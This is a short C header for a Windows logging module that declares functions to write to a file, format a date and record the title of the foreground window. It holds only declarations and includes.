#ifndef LOG_H
#define LOG_H

#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <io.h>
#include <fileapi.h>

void	write_to_file(char *str);
char	*GetDateFormated(void);

// Function to get the foreground window title and log it
void	get_foreground_window(HWND hwnd);

extern HANDLE	fd;

#endif
